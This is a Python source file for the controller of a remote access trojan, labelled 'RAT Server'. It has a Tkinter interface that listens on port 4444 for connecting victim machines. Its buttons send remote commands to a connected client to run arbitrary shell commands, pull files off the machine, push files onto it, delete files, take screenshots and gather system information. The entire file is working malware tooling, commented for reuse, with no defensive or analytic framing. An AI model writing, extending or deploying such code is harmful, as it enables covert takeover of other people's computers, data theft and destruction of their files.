import tkinter as tk
from tkinter import simpledialog, filedialog
import socket
import threading
import os
import subprocess
from datetime import datetime

# Imports what we need

clients = []

# To keep track of clients connected

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)
    log("🚀 Server listening on 0.0.0.0:4444")
    while True:
        client, addr = server.accept()
        log(f"🔗 Connection from {addr[0]}")
        clients.append((client, addr))
        threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()

# Starts the server, listens to all IP addresses from port 4444. If the server is on, it accepts connections.
# Currently max 5 clients

def handle_client(client_socket, addr):
    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                break

            text = data.decode('utf-8', errors='ignore')
            if text.startswith("FILE_TRANSFER"):
                header, rest = text.split("\n", 1)
                _, filename, filesize = header.split(" ")
                filesize = int(filesize)
                payload = rest.encode('utf-8', errors='ignore')
                received = len(payload)

                out_path = f"received_{addr[0]}_{filename}"
                with open(out_path, "wb") as f:
                    f.write(payload)
                    while received < filesize:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
                log(f"✅ Received file '{filename}' ({filesize} bytes) → {out_path}")

            else:
                log(f"[{addr[0]}] {text.strip()}")

        except Exception as e:
            log(f" Error handling {addr[0]}: {e}")
            break

    client_socket.close()
    log(f"🔌 Disconnected {addr[0]}")

# When a client connects, it makes sure that whatever gets sent from the client to the server is understandable.

def send_command(cmd: str):
    if not clients:
        log("⚠️  No clients connected")
        return
    client_socket, addr = clients[0]
    try:
        client_socket.send(cmd.encode())
        log(f"➡️  Sent: {cmd} → {addr[0]}")
    except Exception as e:
        log(f"❌ Failed to send {cmd} to {addr[0]}: {e}")

# For sending commands to the client

def list_dir():
    send_command("LIST_DIR")

# Sends list directory to the client

def get_info():
    send_command("GET_INFO")

# Sends get info about this pc to the client

def exec_shell():
    cmd = simpledialog.askstring("Shell Command", "Enter shell command:")
    if cmd:
        send_command(f"SHELL {cmd}")

# Sends run this/these commands to the client

def download_file():
    path = simpledialog.askstring("Download File", "Enter remote file path:")
    if path:
        send_command(f"DOWNLOAD_FILE {path}")

# Sends download this to the client that gets sent back later on to the server

def upload_file_to_client():
    path = filedialog.askopenfilename(title="Select file to upload to client")
    if not path:
        return
    fname = os.path.basename(path)
    fsize = os.path.getsize(path)
    header = f"UPLOAD_FILE {fname} {fsize}\n".encode()
    client_socket, addr = clients[0]
    try:
        client_socket.send(header)
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b''):
                client_socket.send(chunk)
        log(f"➡️  Uploaded file to {addr[0]}: {fname} ({fsize} bytes)")
    except Exception as e:
        log(f"❌ Upload failed: {e}")

# Uploads a file from your server to the client

def delete_file():
    path = simpledialog.askstring("Delete File", "Enter remote file path to delete:")
    if path:
        send_command(f"DELETE_FILE {path}")

# Deletes a file on the client PC

def take_screenshot():
    send_command("TAKE_SCREENSHOT")

# Takes a screenshot of the client PC

def exit_client():
    send_command("EXIT")

# Exits the program from the client PC

def log(msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_box.insert(tk.END, f"{timestamp}  {msg}\n")
    log_box.see(tk.END)

# Logs from the client PC

# GUI for the server RAT.

root = tk.Tk()
root.title("RAT Server")
root.geometry("920x500")

log_box = tk.Text(root, bg="black", fg="lime", font=("Courier", 10))
log_box.pack(fill=tk.BOTH, expand=True)

# LOGS

frm = tk.Frame(root)
frm.pack(fill=tk.X, pady=5)

btn_cfg = [
    ("Start Server", lambda: threading.Thread(target=start_listener, daemon=True).start()),  # Start server in a new thread
    ("List Dir", list_dir),
    ("Get Info", get_info),
    ("Shell Exec", exec_shell),
    ("Download File", download_file),
    ("Upload File", upload_file_to_client),
    ("Delete File", delete_file),
    ("Screenshot", take_screenshot),
    ("Exit Client", exit_client)
]

for text, cmd in btn_cfg:
    tk.Button(frm, text=text, command=cmd, width=12).pack(side=tk.LEFT, padx=3)

# Starts the program and listens for clicks.
root.mainloop()
